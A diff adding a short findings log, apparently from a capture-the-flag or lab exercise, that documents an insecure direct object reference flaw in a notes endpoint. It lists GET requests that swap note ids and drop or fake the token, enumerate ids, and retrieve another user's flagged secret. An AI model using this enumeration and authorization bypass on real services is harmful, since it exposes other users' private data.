@@ -1,0 +1,18 @@
+alice token AT=eyJ1aWQiOiAiMSIsICJ1c2VyIjogImFsaWNlIn0= (uid=1)
+
+GET /notes?id=1&token=AT            -> {"id": "1", "note": "alice-note", "viewer": "1"}
+GET /notes?id=2&token=AT            -> 200 {"id": "2", "note": "admin-secret-FLAG{idor_user2}", "viewer": "1"}
+     ^ uid=1 reads note id=2 (owned by uid=2) => broken object-level authorization
+
+NO TOKEN AT ALL (authentication not even required):
+GET /notes?id=1 -> {"id": "1", "note": "alice-note", "viewer": null}
+GET /notes?id=2 -> {"id": "2", "note": "admin-secret-FLAG{idor_user2}", "viewer": null}
+GET /notes?id=3 -> {"error": "no note"}
+GET /notes?id=4 -> {"error": "no note"}
+GET /notes?id=5 -> {"error": "no note"}
+GET /notes?id=6 -> {"error": "no note"}
+
+Negative control: token=garbage does NOT block access:
+GET /notes?id=2&token=garbage -> 200 {"id": "2", "note": "admin-secret-FLAG{idor_user2}", "viewer": null}
+
+Impact: full horizontal + unauthenticated read of all notes; flag FLAG{idor_user2} disclosed.
